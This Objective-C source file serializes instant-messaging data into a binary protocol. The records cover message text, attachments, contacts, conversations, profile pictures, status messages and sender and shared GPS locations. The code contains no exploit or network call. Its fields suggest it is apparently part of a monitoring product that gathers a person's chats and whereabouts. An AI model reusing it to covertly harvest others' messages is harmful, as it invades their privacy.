//
//  IMEventProtocolConverter.m
//  IMEvent
//
//  Created by Ophat on 2/1/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "IMEventProtocolConverter.h"
#import "IMConversationEvent.h"
#import "IMAccountEvent.h"
#import "IMContactEvent.h"
#import "IMMessageEvent.h"
#import "IMAttachment.h"

@interface IMEventProtocolConverter (private)
+ (double) GetDoubleBigEndian:(double)nSrc;
+ (void) GetBytesBigEndian:(Byte*)lpBuffer bufSize:(uint32_t)dwBufferSize;
@end

@implementation IMEventProtocolConverter

+(NSData *)convertToProtocolIMMessageEvent:(IMMessageEvent *)aIMMessage{
	NSMutableData *returnData = [NSMutableData data];
	
//	//================================== L_64K
//	uint16_t lengthOfEventType = [aIMMessage mEventType];
//	DLog (@"> lengthOfEventType %d", lengthOfEventType)
//	lengthOfEventType = htons(lengthOfEventType);
//	[returnData appendBytes:&lengthOfEventType length:sizeof(uint16_t)];
//	DLog(@" 2 byte lengthOfEventType is %d returnData \n returnData is %@",lengthOfEventType,returnData);
//	
//	//================================== EventTime
//	NSData * creationDateTime = [[aIMMessage mEventTime] dataUsingEncoding:NSUTF8StringEncoding];
//	DLog (@"> [aIMMessage mEventTime]  %@", [aIMMessage mEventTime])
//	[returnData appendData:creationDateTime];
//	DLog(@"creationDateTime is %@ returnData \n returnData is %@",creationDateTime,returnData);
	
	//================================== Direction
	uint8_t direction = [aIMMessage mDirection];
	[returnData appendBytes:&direction length:sizeof(uint8_t)];
	DLog(@"direction %d returnData %@",direction,returnData);
	
	//================================== mIMServiceID
	uint8_t imServiceID = [aIMMessage mIMServiceID];	
	DLog (@"> imServiceID %d", imServiceID)
	[returnData appendBytes:&imServiceID length:sizeof(uint8_t)];
	//DLog(@"imServiceID %d returnData %@",imServiceID,returnData);
	
	//================================== L256
	uint8_t lenghtofmConversationID = [[aIMMessage mConversationID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenghtofmConversationID %d", lenghtofmConversationID)
	[returnData appendBytes:&lenghtofmConversationID length:sizeof(uint8_t)];
	//DLog(@"lenghtofmConversationID %d returnData %@",lenghtofmConversationID,returnData);
	
	//================================== ConversationID
	NSData * conversationID = [[aIMMessage mConversationID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> conversationID %@", [aIMMessage mConversationID])
	[returnData appendData:conversationID];
	//DLog(@"conversationID is %@ returnData \n returnData is %@",conversationID,returnData);
	
	//================================== L256
	uint8_t lenghtofMessageOriginatorID = [[aIMMessage mMessageOriginatorID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenghtofMessageOriginatorID %d", lenghtofMessageOriginatorID)
	[returnData appendBytes:&lenghtofMessageOriginatorID length:sizeof(uint8_t)];
	//DLog(@"lenghtofMessageOriginatorID %d returnData %@",lenghtofMessageOriginatorID,returnData);
	
	//================================== messageOriginatorID
	NSData * messageOriginatorID = [[aIMMessage mMessageOriginatorID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> messageOriginatorID %@", [aIMMessage mMessageOriginatorID])
	[returnData appendData:messageOriginatorID];
	//DLog(@"messageOriginatorID is %@ returnData \n returnData is %@",messageOriginatorID,returnData);
	
	//========================================================== Location Structure
	
		//================================== L_64K
		uint16_t lenghtofMessageOriginatorlocationPlace = [[aIMMessage mMessageOriginatorlocationPlace]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		DLog (@"> lenghtofMessageOriginatorlocationPlace %d", lenghtofMessageOriginatorlocationPlace)
		lenghtofMessageOriginatorlocationPlace = htons(lenghtofMessageOriginatorlocationPlace);
		[returnData appendBytes:&lenghtofMessageOriginatorlocationPlace length:sizeof(uint16_t)];
		//DLog(@" 2 byte lenghtofMessageOriginatorlocationPlace is %d returnData \n returnData is %@",lenghtofMessageOriginatorlocationPlace,returnData);
	
		//================================== MessageOriginatorlocationPlace
		NSData * messageOriginatorlocationPlace = [[aIMMessage mMessageOriginatorlocationPlace] dataUsingEncoding:NSUTF8StringEncoding];
		DLog (@"mMessageOriginatorlocationPlace %@", [aIMMessage mMessageOriginatorlocationPlace])
		[returnData appendData:messageOriginatorlocationPlace];
		//DLog(@"messageOriginatorlocationPlace is %@ returnData \n returnData is %@",messageOriginatorlocationPlace,returnData);
	
	
		//================================== mMessageOriginatorlocationlongtitude
		double lenghtofMessageOriginatorlocationlongtitude = [aIMMessage mMessageOriginatorlocationlongtitude];
		DLog (@"> lenghtofMessageOriginatorlocationlongtitude %f", lenghtofMessageOriginatorlocationlongtitude)
		lenghtofMessageOriginatorlocationlongtitude = [self GetDoubleBigEndian:lenghtofMessageOriginatorlocationlongtitude];
		[returnData appendBytes:&lenghtofMessageOriginatorlocationlongtitude length:sizeof(double)]; // 8 bytes
		//DLog(@" 8 bytes lenghtofMessageOriginatorlocationlongtitude is %f returnData \n returnData is %@",lenghtofMessageOriginatorlocationlongtitude,returnData);
	
		//================================== mMessageOriginatorlocationlatitude
		double lenghtofMessageOriginatorlocationlatitude = [aIMMessage mMessageOriginatorlocationlatitude];
		DLog (@"> lenghtofMessageOriginatorlocationlatitude %f", lenghtofMessageOriginatorlocationlatitude)
		lenghtofMessageOriginatorlocationlatitude = [self GetDoubleBigEndian:lenghtofMessageOriginatorlocationlatitude];
		[returnData appendBytes:&lenghtofMessageOriginatorlocationlatitude length:sizeof(double)]; // 8 bytes
		//DLog(@" 8 bytes lenghtofMessageOriginatorlocationlatitude is %f returnData \n returnData is %@",lenghtofMessageOriginatorlocationlatitude,returnData);
	
	
		//================================== MessageOriginatorlocationHoraccuracy
		float lenghtofMessageOriginatorlocationHoraccuracy = [aIMMessage mMessageOriginatorlocationHoraccuracy];
		DLog (@"> lenghtofMessageOriginatorlocationHoraccuracy %f", lenghtofMessageOriginatorlocationHoraccuracy)
		//lenghtofMessageOriginatorlocationHoraccuracy = htonl(lenghtofMessageOriginatorlocationHoraccuracy);
		CFSwappedFloat32 swappedValue = CFConvertFloat32HostToSwapped(lenghtofMessageOriginatorlocationHoraccuracy);
		[returnData appendBytes:&swappedValue length:sizeof(float)]; // 4 bytes
		//DLog(@" 4 bytes lenghtofMessageOriginatorlocationHoraccuracy is %f returnData \n returnData is %@",lenghtofMessageOriginatorlocationHoraccuracy,returnData);
	
	//========================================================== Location Structure END
	
	//================================== TEXT_REPRESENTATION
	uint8_t textRepresentation = [aIMMessage mTextRepresentation] ;
	DLog (@"> textRepresentation %d", textRepresentation)
	[returnData appendBytes:&textRepresentation length:sizeof(uint8_t)];
	//DLog(@"textRepresentation is %d returnData \n returnData is %@", textRepresentation,returnData);
	
	
	//================================== L_64K
	uint16_t lengthOfData = [[aIMMessage mData]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lengthOfData %d", lengthOfData)
	lengthOfData = htons(lengthOfData);
	[returnData appendBytes:&lengthOfData length:sizeof(uint16_t)];
	//DLog(@" 2 byte lengthOfData is %d returnData \n returnData is %@",lengthOfData,returnData);
	
	//================================== data
	NSData * data = [[aIMMessage mData] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> data %@", data)
	[returnData appendData:data];
	//DLog(@"data is %@ returnData \n returnData is %@",data,returnData);
	
	//========================================================== Attachment Structure    
	//================================== attachment count
	DLog (@"attachment %@", [aIMMessage mAttachments])
	uint8_t attachmentCount = [[aIMMessage mAttachments] count];
	DLog (@"> attachmentCount %d", attachmentCount)	
	[returnData appendBytes:&attachmentCount length:sizeof(uint8_t)];
	
	for (int i = 0; i< [[aIMMessage mAttachments]count]; i++) {
		DLog (@"> attachment %d", i)
		IMAttachment *attachment =[[aIMMessage mAttachments]objectAtIndex:i];
		
		//================================== L_64K
		uint16_t lengthOfAttachmentFullname = [[attachment mAttachmentFullname]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		lengthOfAttachmentFullname = htons(lengthOfAttachmentFullname);
		[returnData appendBytes:&lengthOfAttachmentFullname length:sizeof(uint16_t)];
		DLog(@" 2 byte lengthOfAttachmentFullname is %d returnData \n returnData is %@",lengthOfAttachmentFullname,returnData);
		
		//================================== mAttachmentFullname
		NSData * attachmentFullname = [[attachment mAttachmentFullname] dataUsingEncoding:NSUTF8StringEncoding];
		[returnData appendData:attachmentFullname];
		DLog(@"attachmentFullname is %@ returnData \n returnData is %@",attachmentFullname,returnData);
		
		//================================== L256
		uint8_t lenghtofmMIMEType  = [[attachment mMIMEType]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[returnData appendBytes:&lenghtofmMIMEType length:sizeof(uint8_t)];
		DLog(@"lenghtofmMIMEType %d returnData %@",lenghtofmMIMEType,returnData);
		
		//================================== mMIMEType
		NSData * MIMEType = [[attachment mMIMEType] dataUsingEncoding:NSUTF8StringEncoding];
		[returnData appendData:MIMEType];
		DLog (@"[attachment mMIMEType] %@", [attachment mMIMEType])
		DLog(@"MIMEType is %@ returnData \n returnData is %@",MIMEType,returnData);
		
		//================================== L_data
		uint32_t lengthOfThumbNailData= [[attachment mThumbNailData] length];
		lengthOfThumbNailData = htonl(lengthOfThumbNailData);
		[returnData appendBytes:&lengthOfThumbNailData length:sizeof(uint32_t)];
		DLog(@" 4 byte lengthOfThumbNailData is %u returnData \n returnData is %@",lengthOfThumbNailData,returnData);		
		//================================== mThumbNailData
		NSData * thumbNailData = [attachment mThumbNailData];
		[returnData appendData:thumbNailData];
		//DLog(@"thumbNailData is %@ returnData \n returnData is %@",thumbNailData,returnData);
		DLog(@"thumbNailData is %d", [thumbNailData length]);
		
		//================================== L_data
		uint32_t lengthOfAttachmentData = [[attachment mAttachmentData] length];		
		DLog(@" 4 byte lengthOfAttachmentData is %u", lengthOfAttachmentData);
		
		lengthOfAttachmentData = htonl(lengthOfAttachmentData);
		[returnData appendBytes:&lengthOfAttachmentData length:sizeof(uint32_t)];
		//DLog(@" 4 byte lengthOfAttachmentData is %d returnData \n returnData is %@",lengthOfAttachmentData,returnData);
		
		//================================== AttachmentData
		NSData * attachmentData = [attachment mAttachmentData];
		[returnData appendData:attachmentData];
		//DLog(@"attachmentData is %@ returnData \n returnData is %@",attachmentData,returnData);
		DLog(@"attachmentData is %d", [attachmentData length]);
	}
	
	//========================================================== Attachment Structure End
	
	// ** The share location will be used when TEXT_REPRESENTATION is Share Location (16)
	//========================================================== Location Structure
		
		//================================== L_64K
		uint16_t lenghtofShareLocationPlace = [[aIMMessage mShareLocationPlace]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		lenghtofShareLocationPlace = htons(lenghtofShareLocationPlace);
		[returnData appendBytes:&lenghtofShareLocationPlace length:sizeof(uint16_t)];
		//DLog(@" 2 byte lenghtofShareLocationPlace is %d returnData \n returnData is %@",lenghtofShareLocationPlace,returnData);
		
		//================================== ShareLocationPlace
		NSData * shareLocationPlace = [[aIMMessage mShareLocationPlace] dataUsingEncoding:NSUTF8StringEncoding];
		[returnData appendData:shareLocationPlace];
		//DLog(@"shareLocationPlace is %@ returnData \n returnData is %@",shareLocationPlace,returnData);		
		
		//================================== mShareLocationlongtitude
		double lenghtofShareLocationlongtitude = [aIMMessage mShareLocationlongtitude];
		lenghtofShareLocationlongtitude = [self GetDoubleBigEndian:lenghtofShareLocationlongtitude];
		[returnData appendBytes:&lenghtofShareLocationlongtitude length:sizeof(double)]; // 8 bytes
		//DLog(@" 8 bytes lenghtofShareLocationlongtitude is %f returnData \n returnData is %@",lenghtofShareLocationlongtitude,returnData);
		
		//================================== mShareLocationlatitude
		double lenghtofShareLocationlatitude = [aIMMessage mShareLocationlatitude];
		lenghtofShareLocationlatitude = [self GetDoubleBigEndian:lenghtofShareLocationlatitude];
		[returnData appendBytes:&lenghtofShareLocationlatitude length:sizeof(double)]; // 8 bytes
		//DLog(@" 8 bytes lenghtofShareLocationlatitude is %f returnData \n returnData is %@",lenghtofShareLocationlatitude,returnData);
		
		
		//================================== mShareLocationHoraccuracy
		float lenghtofShareLocationHoraccuracy = [aIMMessage mShareLocationHoraccuracy];
 		DLog (@"[aIMMessage mShareLocationHoraccuracy] %f", [aIMMessage mShareLocationHoraccuracy])
		//lenghtofShareLocationHoraccuracy = htonl(lenghtofShareLocationHoraccuracy);
		CFSwappedFloat32 shareLocationHorAccuracy = CFConvertFloat32HostToSwapped(lenghtofShareLocationHoraccuracy);
		[returnData appendBytes:&shareLocationHorAccuracy length:sizeof(float)];							// 4 bytes
		//DLog(@"4 bytes lenghtofShareLocationHoraccuracy is %f returnData \n returnData is %@",lenghtofShareLocationHoraccuracy,returnData);
		
	//========================================================== Location Structure END
		
	return returnData;
}
+(NSData *)convertToProtocolIMConversationEvent:(IMConversationEvent *)aIMConversation{
	NSMutableData *returnData = [NSMutableData data];
//	
//	//================================== L_64K
//	uint16_t lengthOfEventType = [aIMConversation mEventType];
//	lengthOfEventType = htons(lengthOfEventType);
//	[returnData appendBytes:&lengthOfEventType length:sizeof(uint16_t)];
//	DLog(@" 2 byte lengthOfEventType is %d returnData \n returnData is %@",lengthOfEventType,returnData);
//	
//	//================================== EventTime
//	NSData * creationDateTime = [[aIMConversation mEventTime] dataUsingEncoding:NSUTF8StringEncoding];
//	[returnData appendData:creationDateTime];
//	DLog(@"creationDateTime is %@ returnData \n returnData is %@",creationDateTime,returnData);
	
	//================================== mIMServiceID
	uint8_t imServiceID = [aIMConversation mIMServiceID];
	DLog(@"> imServiceID %d",imServiceID);
	[returnData appendBytes:&imServiceID length:sizeof(uint8_t)];
	//DLog(@"imServiceID %d returnData %@",imServiceID,returnData);
	
	//================================== L256
	uint8_t lenghtofaccountownerid  = [[aIMConversation mAccountOwnerID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenght of account ownerid %d", lenghtofaccountownerid)
	[returnData appendBytes:&lenghtofaccountownerid length:sizeof(uint8_t)];
	//DLog(@"lenghtofaccountownerid %d returnData %@",lenghtofaccountownerid,returnData);
	
	//================================== AccountOwnerID
	NSData * accountOwnerID = [[aIMConversation mAccountOwnerID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> mAccountOwnerID: %@", [aIMConversation mAccountOwnerID])
	[returnData appendData:accountOwnerID];
	//DLog(@"accountOwnerID is %@ returnData \n returnData is %@",accountOwnerID,returnData);
	
	//================================== L256
	uint8_t lenghtofConversationID = [[aIMConversation mConversationID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenght of ConversationID %d", lenghtofConversationID)
	[returnData appendBytes:&lenghtofConversationID length:sizeof(uint8_t)];
	//DLog(@"lenghtofConversationID %d returnData %@",lenghtofConversationID,returnData);
	
	//================================== ConversationID
	NSData * ConversationID = [[aIMConversation mConversationID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> ConversationID %@", [aIMConversation mConversationID])
	[returnData appendData:ConversationID];
	//DLog(@"ConversationID is %@ returnData \n returnData is %@",ConversationID,returnData);
	
	//================================== L256
	uint8_t lenghtofConversationName = [[aIMConversation mConversationName]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenght of ConversationName %d", lenghtofConversationName)
	[returnData appendBytes:&lenghtofConversationName length:sizeof(uint8_t)];
	//DLog(@"lenghtofConversationName %d returnData %@",lenghtofConversationName,returnData);
	
	//================================== ConversationName
	NSData * conversationName = [[aIMConversation mConversationName] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> conversationName %@", [aIMConversation mConversationName])
	[returnData appendData:conversationName];
	//DLog(@"conversationName is %@ returnData \n returnData is %@",conversationName,returnData);
		
	//================================== L_64K (contact count)
	uint16_t lengthOfContacts = [[aIMConversation mContacts]count];
	DLog (@"> lengthOfContacts %d", lengthOfContacts)
	lengthOfContacts = htons(lengthOfContacts);
	[returnData appendBytes:&lengthOfContacts length:sizeof(uint16_t)];
	//DLog(@" 2 byte lengthOfContacts is %d returnData \n returnData is %@",lengthOfContacts,returnData);
	
	//================================== Contacts
	for (int i=0; i<[[aIMConversation mContacts]count]; i++) {
		NSString *tempmContacts = [[aIMConversation mContacts]objectAtIndex:i];
		
		//================================== L256
		uint8_t lenghtoftempmContacts = [tempmContacts lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		DLog (@"> lenght of contact %d", lenghtoftempmContacts)
		[returnData appendBytes:&lenghtoftempmContacts length:sizeof(uint8_t)];
		//DLog(@"lenghtoftempmContacts %d returnData %@",lenghtoftempmContacts,returnData);

		//================================== Contacts Each
		NSData * contacts = [tempmContacts dataUsingEncoding:NSUTF8StringEncoding];
		DLog (@"> contact %@", tempmContacts)
		[returnData appendData:contacts];
		//DLog(@"contacts is %@ returnData \n returnData is %@",contacts,returnData);
	}

	//================================== L_data
	uint32_t lengthOfPictureProfile = [[aIMConversation mPictureProfile] length];
	DLog (@"> lenght of profile picture (Conversation) %d", lengthOfPictureProfile)
	lengthOfPictureProfile = htonl(lengthOfPictureProfile);
	[returnData appendBytes:&lengthOfPictureProfile length:sizeof(uint32_t)];
	DLog(@" 4 byte lengthOfPictureProfile is %d returnData \n returnData is %@",lengthOfPictureProfile,returnData);
	
	//================================== ContactPictureProfile
	NSData * pictureProfile = [aIMConversation mPictureProfile];
	[returnData appendData:pictureProfile];
	//DLog(@"pictureProfile is %@ returnData \n returnData is %@",pictureProfile,returnData);
	
	//================================== L_64K
	uint16_t lengthOfStatusMessage = [[aIMConversation mStatusMessage]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lenght of status message %d", lengthOfStatusMessage)
	lengthOfStatusMessage = htons(lengthOfStatusMessage);
	[returnData appendBytes:&lengthOfStatusMessage length:sizeof(uint16_t)];
	//DLog(@" 2 byte lengthOfStatusMessage is %d returnData \n returnData is %@",lengthOfStatusMessage,returnData);
	
	//================================== StatusMessage
	NSData * statusMessage = [[aIMConversation mStatusMessage] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> statusMessage %@", statusMessage)
	[returnData appendData:statusMessage];
	//DLog(@"statusMessage is %@ returnData \n returnData is %@",statusMessage,returnData);
	
	//DLog(@"returnData is%@",returnData);
	return returnData;
}

+(NSData *)convertToProtocolIMAccountEvent:(IMAccountEvent *)aIMAccount{
	NSMutableData *returnData = [NSMutableData data];
	
//	//================================== L_64K
//	uint16_t lengthOfEventType = [aIMAccount mEventType];
//	lengthOfEventType = htons(lengthOfEventType);
//	[returnData appendBytes:&lengthOfEventType length:sizeof(uint16_t)];
//	DLog(@" 2 byte lengthOfTitle is %d returnData \n returnData is %@",lengthOfEventType,returnData);
//	
//	//================================== EventTime
//	NSData * creationDateTime = [[aIMAccount mEventTime] dataUsingEncoding:NSUTF8StringEncoding];
//	[returnData appendData:creationDateTime];
//	DLog(@"creationDateTime is %@ returnData \n returnData is %@",creationDateTime,returnData);
	
	//================================== mIMServiceID
	uint8_t imServiceID = [aIMAccount mIMServiceID];
	DLog (@"> service id %d", imServiceID)
	[returnData appendBytes:&imServiceID length:sizeof(uint8_t)];
	DLog(@"imServiceID %d returnData %@",imServiceID,returnData);
	
	//================================== L256
	uint8_t lenghtofaccountownerid  = [[aIMAccount mAccountOwnerID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[returnData appendBytes:&lenghtofaccountownerid length:sizeof(uint8_t)];
	DLog(@"lenghtofaccountownerid %d returnData %@",lenghtofaccountownerid,returnData);
	
	//================================== ACCOUNT_OWNER_ID
	NSData * accountOwnerID = [[aIMAccount mAccountOwnerID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> accountOwnerID %@", [aIMAccount mAccountOwnerID])
	[returnData appendData:accountOwnerID];
	//DLog(@"accountOwnerID is %@ returnData \n returnData is %@",accountOwnerID,returnData);
	
	//================================== L_64K
	uint16_t lengthOfAccountOwnerDisplayName = [[aIMAccount mAccountOwnerDisplayName]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"length of display name %d", lengthOfAccountOwnerDisplayName)
	lengthOfAccountOwnerDisplayName = htons(lengthOfAccountOwnerDisplayName);
	[returnData appendBytes:&lengthOfAccountOwnerDisplayName length:sizeof(uint16_t)];
	DLog(@" 2 byte lengthOfAccountOwnerDisplayName is %d returnData \n returnData is %@",lengthOfAccountOwnerDisplayName,returnData);
	
	//================================== AccountOwnerDisplayName
	NSData * accountOwnerDisplayName = [[aIMAccount mAccountOwnerDisplayName] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> owner display name %@", [aIMAccount mAccountOwnerDisplayName])
	[returnData appendData:accountOwnerDisplayName];
	DLog(@"AccountOwnerDisplayName is %@ returnData \n returnData is %@",accountOwnerDisplayName,returnData);
	
	//================================== L_64K
	uint16_t lengthOfAccountOwnerStatusMessage = [[aIMAccount mAccountOwnerStatusMessage]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lengthOfAccountOwnerStatusMessage %d", lengthOfAccountOwnerStatusMessage)
	lengthOfAccountOwnerStatusMessage = htons(lengthOfAccountOwnerStatusMessage);
	[returnData appendBytes:&lengthOfAccountOwnerStatusMessage length:sizeof(uint16_t)];
	DLog(@" 2 byte lengthOfTitle is %d returnData \n returnData is %@",lengthOfAccountOwnerStatusMessage,returnData);
	
	//================================== AccountOwnerStatusMessage
	NSData * accountOwnerStatusMessage = [[aIMAccount mAccountOwnerStatusMessage] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> owner status message %@", [aIMAccount mAccountOwnerStatusMessage])
	[returnData appendData:accountOwnerStatusMessage];
	DLog(@"mAccountOwnerStatusMessage is %@ returnData \n returnData is %@",accountOwnerStatusMessage,returnData);
	
	//================================== L_data
	uint32_t lengthOfAccountOwnerPictureProfile = [[aIMAccount mAccountOwnerPictureProfile] length];
	DLog (@"> length of owner picture profile %d", lengthOfAccountOwnerPictureProfile)
	lengthOfAccountOwnerPictureProfile = htonl(lengthOfAccountOwnerPictureProfile);
	[returnData appendBytes:&lengthOfAccountOwnerPictureProfile length:sizeof(uint32_t)];
	DLog(@" 4 byte lengthOfAccountOwnerPictureProfile is %d returnData \n returnData is %@",lengthOfAccountOwnerPictureProfile,returnData);
	
	//================================== AccountOwnerDisplayName
	NSData * accountOwnerPictureProfile = [aIMAccount mAccountOwnerPictureProfile];
	//DLog (@"> accountOwnerPictureProfile %@", accountOwnerPictureProfile)
	[returnData appendData:accountOwnerPictureProfile];
	//DLog(@"accountOwnerPictureProfile is %@ returnData \n returnData is %@",accountOwnerPictureProfile,returnData);
	
	//DLog(@"returnData is%@",returnData);
	return returnData;
}

+(NSData *)convertToProtocolIMContactEvent:(IMContactEvent *)aIMContact{
	NSMutableData *returnData = [NSMutableData data];
	
//	//================================== L_64K
//	uint16_t lengthOfEventType = [aIMContact mEventType];
//	lengthOfEventType = htons(lengthOfEventType);
//	[returnData appendBytes:&lengthOfEventType length:sizeof(uint16_t)];
//	DLog(@" 2 byte lengthOfEventType is %d returnData \n returnData is %@",lengthOfEventType,returnData);
//	
//	//================================== EventTime
//	NSData * creationDateTime = [[aIMContact mEventTime] dataUsingEncoding:NSUTF8StringEncoding];
//	[returnData appendData:creationDateTime];
//	DLog(@"creationDateTime is %@ returnData \n returnData is %@",creationDateTime,returnData);
	
	//================================== mIMServiceID
	uint8_t imServiceID = [aIMContact mIMServiceID];
	DLog (@"> service id %d", imServiceID)
	[returnData appendBytes:&imServiceID length:sizeof(uint8_t)];
	//DLog(@"imServiceID %d returnData %@",imServiceID,returnData);
	
	//================================== L256
	uint8_t lenghtofaccountownerid  = [[aIMContact mAccountOwnerID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[returnData appendBytes:&lenghtofaccountownerid length:sizeof(uint8_t)];
	//DLog(@"lenghtofaccountownerid %d returnData %@",lenghtofaccountownerid,returnData);
	
	//================================== ACCOUNT_OWNER_ID
	NSData * accountOwnerID = [[aIMContact mAccountOwnerID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> accountOwnerID %@", [aIMContact mAccountOwnerID])
	[returnData appendData:accountOwnerID];
	//DLog(@"accountOwnerID is %@ returnData \n returnData is %@",accountOwnerID,returnData);
	
	//================================== L256
	uint8_t lenghtofContactID  = [[aIMContact mContactID]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[returnData appendBytes:&lenghtofContactID length:sizeof(uint8_t)];
	//DLog(@"lenghtofaccountownerid %d returnData %@",lenghtofContactID,returnData);
	
	//================================== ContactID
	NSData * contactID = [[aIMContact mContactID] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> contact id %@", [aIMContact mContactID])
	[returnData appendData:contactID];
	//DLog(@"contactID is %@ returnData \n returnData is %@",contactID,returnData);
	
	//================================== L_64K
	uint16_t lengthOfContactDisplayName = [[aIMContact mContactDisplayName]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	lengthOfContactDisplayName = htons(lengthOfContactDisplayName);
	[returnData appendBytes:&lengthOfContactDisplayName length:sizeof(uint16_t)];
	//DLog(@" 2 byte lengthOfContactDisplayName is %d returnData \n returnData is %@",lengthOfContactDisplayName,returnData);
	
	//================================== ContactDisplayName
	NSData * contactDisplayName = [[aIMContact mContactDisplayName] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> contact display name: %@", [aIMContact mContactDisplayName])
	[returnData appendData:contactDisplayName];
	//DLog(@"ContactDisplayName is %@ returnData \n returnData is %@",contactDisplayName,returnData);
	
	//================================== L_64K
	uint16_t lengthOfContactStatusMessage = [[aIMContact mContactStatusMessage]lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> lengthOfContactStatusMessage: %d", lengthOfContactStatusMessage)
	lengthOfContactStatusMessage = htons(lengthOfContactStatusMessage);
	[returnData appendBytes:&lengthOfContactStatusMessage length:sizeof(uint16_t)];
	//DLog(@" 2 byte lengthOfContactStatusMessage is %d returnData \n returnData is %@",lengthOfContactStatusMessage,returnData);
	
	//================================== ContactStatusMessage
	NSData * contactStatusMessage = [[aIMContact mContactStatusMessage] dataUsingEncoding:NSUTF8StringEncoding];
	DLog (@"> contact status message: %@", [aIMContact mContactStatusMessage])
	[returnData appendData:contactStatusMessage];
	//DLog(@"contactStatusMessage is %@ returnData \n returnData is %@",contactStatusMessage,returnData);
	
	//================================== L_data
	uint32_t lengthOfContactPictureProfile = [[aIMContact mContactPictureProfile] length];
	DLog (@"> length of contact picture profile %d", lengthOfContactPictureProfile)
	lengthOfContactPictureProfile = htonl(lengthOfContactPictureProfile);
	[returnData appendBytes:&lengthOfContactPictureProfile length:sizeof(uint32_t)];
	//DLog(@" 4 byte lengthOfContactPictureProfile is %d returnData \n returnData is %@",lengthOfContactPictureProfile,returnData);
	
	//================================== ContactPictureProfile
	NSData * contactPictureProfile = [aIMContact mContactPictureProfile];
	//DLog (@"> contactPictureProfile %@", contactPictureProfile)
	[returnData appendData:contactPictureProfile];
	//DLog(@"contactPictureProfile is %@ returnData \n returnData is %@",contactPictureProfile,returnData);
			
	//DLog(@"returnData is%@",returnData);
	return returnData;
}

+ (void) GetBytesBigEndian:(Byte*)lpBuffer bufSize:(uint32_t)dwBufferSize {
	for (uint32_t i = 0; i < (dwBufferSize / 2); i++) { 
		Byte c = lpBuffer[i]; 
		lpBuffer[i] = lpBuffer[dwBufferSize - 1 - i]; 
		lpBuffer[dwBufferSize - 1 - i] = c; 
	}
}

+(double) GetDoubleBigEndian:(double)nSrc {
	double nDest = nSrc;
	[self GetBytesBigEndian:(Byte*)&nDest bufSize:sizeof(double)];
	return nDest;
}


@end
